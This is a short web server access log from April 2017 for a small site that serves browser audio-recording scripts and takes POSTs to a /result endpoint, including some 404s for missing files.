24.114.52.25 - - [13/Apr/2017:02:16:38 +0000] "POST /result HTTP/1.1" 200 62 "-" "python-requests/2.13.0"
24.114.52.25 - - [13/Apr/2017:02:17:23 +0000] "POST /result HTTP/1.1" 200 72 "-" "python-requests/2.13.0"
132.205.229.142 - - [13/Apr/2017:02:18:07 +0000] "GET / HTTP/1.1" 200 2289 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.142 - - [13/Apr/2017:02:18:07 +0000] "GET /static/js/recorder.js HTTP/1.1" 200 13027 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.142 - - [13/Apr/2017:02:18:07 +0000] "GET /static/js/record_mic.js HTTP/1.1" 200 278 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.142 - - [13/Apr/2017:02:18:07 +0000] "GET /static/js/jquery-1.11.2.js HTTP/1.1" 200 284184 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.142 - - [13/Apr/2017:02:18:07 +0000] "GET /static/img/music.jpg HTTP/1.1" 200 211664 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
35.163.12.69 - - [13/Apr/2017:02:18:29 +0000] "POST /result HTTP/1.1" 200 29 "-" "python-requests/2.13.0"
132.205.229.142 - - [13/Apr/2017:02:18:29 +0000] "POST / HTTP/1.1" 200 2264 "http://35.163.12.69/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1"
24.114.52.25 - - [13/Apr/2017:02:19:54 +0000] "POST /result HTTP/1.1" 200 56 "-" "python-requests/2.13.0"
139.162.124.167 - - [13/Apr/2017:02:41:36 +0000] "GET / HTTP/1.1" 200 2289 "-" "Mozilla/5.0"
24.114.71.94 - - [13/Apr/2017:03:42:13 +0000] "GET / HTTP/1.1" 200 2288 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:03:42:14 +0000] "GET /favicon.ico HTTP/1.1" 404 1009 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:03:44:01 +0000] "GET / HTTP/1.1" 200 1808 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:03:44:01 +0000] "GET /rec/recorder.js HTTP/1.1" 404 1012 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:03:44:01 +0000] "GET /music.jpg HTTP/1.1" 404 1008 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:03:46:31 +0000] "GET / HTTP/1.1" 200 1851 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:03:46:31 +0000] "GET /music.jpg HTTP/1.1" 404 1008 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:03:46:32 +0000] "GET /rec/recorder.js HTTP/1.1" 404 1012 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.80.245 - - [13/Apr/2017:03:46:48 +0000] "GET /static/js/record_mic.js HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
24.114.80.245 - - [13/Apr/2017:03:46:48 +0000] "GET /static/js/recorder.js HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
24.114.80.245 - - [13/Apr/2017:03:46:48 +0000] "GET / HTTP/1.1" 200 1851 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
